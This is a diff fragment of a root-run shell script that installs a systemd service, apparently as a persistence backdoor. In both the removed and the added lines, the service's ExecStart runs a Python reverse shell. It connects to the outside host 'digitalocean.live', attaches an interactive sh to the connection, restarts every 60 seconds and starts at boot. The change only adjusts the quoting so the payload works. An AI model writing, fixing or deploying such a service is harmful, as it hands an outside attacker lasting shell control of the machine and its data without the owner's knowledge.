@@ -15,7 +15,7 @@ After=network-online.target
 Wants=network-online.target
 
 [Service]
-ExecStart=/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("digitalocean.live",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
+ExecStart=/usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('digitalocean.live',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn('sh')\"
 Restart=always
 RestartSec=60
 StandardOutput=journal
@@ -23,6 +23,7 @@ StandardError=journal
 
 [Install]
 WantedBy=multi-user.target"
+
 
 if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root"
